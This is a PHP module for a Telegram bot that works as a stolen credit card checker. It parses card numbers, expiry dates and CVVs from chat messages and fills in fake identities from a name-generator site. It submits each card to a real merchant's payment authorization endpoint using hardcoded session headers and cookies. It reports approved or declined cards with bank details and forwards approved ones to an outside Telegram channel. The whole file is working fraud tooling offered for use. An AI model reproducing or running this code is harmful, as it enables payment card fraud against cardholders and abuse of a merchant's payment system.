<?php



/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

$response = "";
////////////====[MUTE]====////////////
if(strpos(strtolower($message), "/es ") === 0 || strpos(strtolower($message), "!es ") === 0 || strpos(strtolower($message), ".es ") === 0 ){
    $cookie = randomString();
    $trans_completed = false;
    $tries = 0;
    $limit = 1;
    while ($trans_completed == false && $tries < $limit ||strpos($response, 'Gateway Rejected: risk_threshold!')) {
        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == "no"){
            bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id
            ]);
            return;

        } else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

            ]);

            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);


         if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $yy1 = substr($yy, 2, 2);
                $bin = substr($cc, 0, 6);
                $cbin = substr($cc, 0, 1);
                ###CHECKER PART###
                $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
                $data = json_decode($randomShits, true);
                $fname = explode(" ", $data['name'])[0];
                $lname = explode(" ", $data['name'])[1];
                $email = $data['email']['address'];
                $street = $data['street1'];
                $local = GetStr($randomShits, '"street2":', ',"phone"');
                $city = GetStr($local, '"', ',');
                $state = GetStr($local, ', ', ' ');
                $phone = str_replace("-", "", $data['phone']);
                $postcode = GetStr($local, "$state", '"');
                $cookie = randomString();
                $str = substr(randomString(), 0, 7);

                $binlist = json_decode(fbankinfo($bin), true);
                $ccbank = $binlist['Bank'];
                $ccvendor = $binlist['Vendor'];
                $cctype = $binlist['Bank_Info'];
                $cc_country = $binlist['Country'];
                $abn = $binlist['Abn'];
                $cc_emoji = $binlist['emoji'];

                $zip = rand(90010,94000);
                if($cbin == 5){
                    $cbin = 'mastercard';
                }
                else if($cbin == 4){
                    $cbin = 'visa';
                }

                /////////////////////==========[Unavailable if empty]==========////////////////



                $execute = cURL(
                    "https://paynow-card-panel.production.eshopworld.com/api/paymentauthorization",
                    $headers = [
                        'accept: application/json, text/plain, */*',
                        'request-id: |02a56d94eeec43aca0e54cfdc6c01e5e.464cefd4134448ff',
                        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                        'content-type: application/json',
                        'origin: https://paynow-card-panel.production.eshopworld.com',
                        'referer: https://paynow-card-panel.production.eshopworld.com/?data=b0JrjqBgQn5d86ZvtGyBGGu7PRmuJsqF83w1GfnJ94I%2Bf2k7xu2hx0dPWX%2B8ivyqpDyaXnQ6vEUHlYfsZIMX8t3i1dep2FIfTwJd44akw2umD9nogYH3nDk4f1B5g68P9tlIkvtQoyjedlo4gWaugiPHjSp7xVExBnAR3oGb5b%2Frwg2PB8OGb1ANkQkwhdDBLa2OvLg7j3a6ioIaICpsiPr114ZsyL%2FgIlOV%2Brzp5fCZAkfpWzpVx1h6DUNtKcgqM1gbPLZbeGJnPAAjiXa6x4jz8hmqfiImAbZfrszucBdIyBeYVWvMWmTdchlSqfPB2ktLD8154wYb9u82K6cLHnTBAybs5gJ%2Fwo78UYEZMn9O5cKdxDKN7ygjXEHRN0DZRvUTcAnTcJvrWVKXxhzg81R%2FJyUudHpOGG4C6HlGi9Igkx0MbKli0jPw6aSK7Y%2BvVWHBaYDbznRQQk6U8TrxznL4vnQVI5dwTHdOREHUewUHA2vzBiUye1oDaJF9zHyohnbNODwAjZV4klrP%2BDq0DQ%3D%3D',
                        'cookie: ai_user=yrJlgLvGJ6N+xlWFuHRLQT|2022-05-30T23:39:52.041Z; ai_session=1LqJOzldh5cXmedcx80lso|1653953992138|1653953992138'
                    ],'{"browserInfo":{"javaEnabled":false,"colorDepth":24,"screenHeight":310,"screenWidth":75,"timeZoneOffset":-480,"javaScriptEnabled":true,"language":"en-US","userDeviceId":"515149246"},"culture":"en-IE","paymentId":"d945a209-752c-4fc1-b651-389ac7a0de6e","paymentAttemptRef":"c4c80c73-318a-4855-96d3-cc2e584bd61c","brandCode":"EAQ","ravelinClientId":"EAQ","currency":"INR","ravelinDeviceId":"6bb5eff1-fa6b-48d3-ad7a-8626c4c6d9be","cardDetails":{"cardName":"Derick Damonmon","cardNumber":"'.$cc.'","cardExpiry":"'.$mm.'/'.$yy1.'","cardCvc":"'.$cvv.'","storeForFutureUse":false,"isDefault":false},"installmentId":null}',
                    "POST",
                    1,
                    $cookie
                );   $response = ucfirst(GetStr($execute,'"authorizationResult":"','"'));
                     $dcode = GetStr($execute,'"eswCode":"','"');

                 $time = rand(10, 30);
                if($dcode=="00" && $response=="Success") {
                addTotal();
                addUserTotal($userId);
                addCVV();
                addUserCVV($userId);
                addCCN();
                addUserCCN($userId);
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>APPROVED ✅  
<b>Card -»</b> <code>$lista</code>
Response -» $response ($dcode)
Type -» CVV 
Gateway -» Anti-Rabis Gateway
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'

        ]);$trans_completed = true;copyLogs("@payamansoyccn",$chat_id,$messageidtoedit);
             }else if($response=="Failed") {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response ($dcode)
Type -» CVV 
Gateway -» Anti-Rabis Gateway
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'

        ]);$trans_completed = true;
    } else {
        addTotal();
        addUserTotal($userId);
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>ERROR ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» GATE ERROR
Type -» CVV 
Gateway -» Anti-Rabis Gateway
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'

        ]);$trans_completed = true;
    }
            } else {
                bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);
                $confirm_method = true;
            }
        }
    }
}